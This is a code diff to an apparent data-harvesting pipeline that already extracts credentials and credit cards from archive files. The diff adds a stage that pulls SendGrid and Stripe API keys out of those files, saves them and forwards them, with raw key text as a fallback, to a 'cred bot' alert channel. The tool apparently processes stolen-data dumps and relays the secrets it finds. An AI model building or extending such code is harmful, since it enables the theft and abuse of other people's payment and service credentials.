@@ -22,6 +22,7 @@ from database_manager import DatabaseManager, Job
 from extractor import ArchiveProcessor
 from parse_credentials import scan_tree, write_results, extract_raw_credentials
 from parse_credit_cards import extract_credit_cards, format_credit_card_line, write_credit_cards_file
+from parse_api_keys import extract_api_keys, format_api_key_line, write_api_keys_file
 from password_store import PasswordStore
 from session_store import SessionStore
 from secure_logging import configure_logging
@@ -474,6 +475,48 @@ class Pipeline:
                 'cards_count': len(cards),
                 'files_with_cards': unique_files,
                 'stage': 'credit-card-alert',
+            },
+        )
+
+    async def alert_api_keys(self, job: Job, keys: list[dict]) -> None:
+        """Persist + push found SendGrid/Stripe keys to the alert bot whenever configured."""
+        if not keys:
+            return
+        await asyncio.to_thread(self.db.save_api_keys, job.id, keys)
+        keys_file = self.s.output_dir / f'api-keys-{job.message_id}.txt'
+        key_lines = [format_api_key_line(key) for key in keys]
+        await asyncio.to_thread(
+            lambda: (
+                write_api_keys_file(keys, keys_file),
+            )
+        )
+        unique_files = len({k['file'] for k in keys})
+        by_type: dict[str, int] = {}
+        for key in keys:
+            key_type = str(key.get('key_type') or '')
+            by_type[key_type] = by_type.get(key_type, 0) + 1
+        source = job.source_link or job.source or 'job'
+        caption = (
+            f"🔑 API keys found\n"
+            f"Job #{job.id}\n"
+            f"Source: {source}\n"
+            f"Count: {len(keys)}\n"
+            f"Files: {unique_files}\n"
+            f"Types: {', '.join(f'{k}={v}' for k, v in sorted(by_type.items()))}"
+        )
+        sent = await self.notify_cred_bot(caption, document=keys_file)
+        if not sent:
+            body = caption + "\n\n" + "\n".join(key_lines)
+            for start in range(0, len(body), 3500):
+                await self.notify_cred_bot(body[start:start + 3500])
+        LOG.info(
+            'API keys extracted and alerted',
+            extra={
+                'job_id': job.id,
+                'message_id': job.message_id,
+                'keys_count': len(keys),
+                'files_with_keys': unique_files,
+                'stage': 'api-key-alert',
             },
         )
 
@@ -1129,6 +1172,24 @@ class Pipeline:
                 if job.chat_id:
                     await self.notify(job.chat_id,'⚠️ No credit cards found in extracted files',job.message_id)
                 LOG.info('No credit cards found', extra={'job_id': job.id, 'message_id': job.message_id, 'stage': 'processing'})
+
+            await self.notify(job.chat_id,'🔑 Scanning for SendGrid and Stripe keys…',job.message_id)
+            raw_keys=await asyncio.to_thread(
+                extract_api_keys, root, 8, self.s.output_dir, self.s.max_scan_file_bytes
+            )
+            if raw_keys:
+                await self.alert_api_keys(job, raw_keys)
+                if job.chat_id:
+                    keys_msg=(
+                        f"🔑 SendGrid/Stripe keys extracted\n"
+                        f"📊 Total keys found: {len(raw_keys)}\n"
+                        f"📁 Files containing keys: {len(set(k['file'] for k in raw_keys))}"
+                    )
+                    await self.notify(job.chat_id, keys_msg, job.message_id)
+            else:
+                if job.chat_id:
+                    await self.notify(job.chat_id,'⚠️ No SendGrid or Stripe keys found in extracted files',job.message_id)
+                LOG.info('No API keys found', extra={'job_id': job.id, 'message_id': job.message_id, 'stage': 'processing'})
             
             # Send redacted reports (best-effort — chat bans must not fail a completed scan).
             if job.chat_id and self.client is not None:
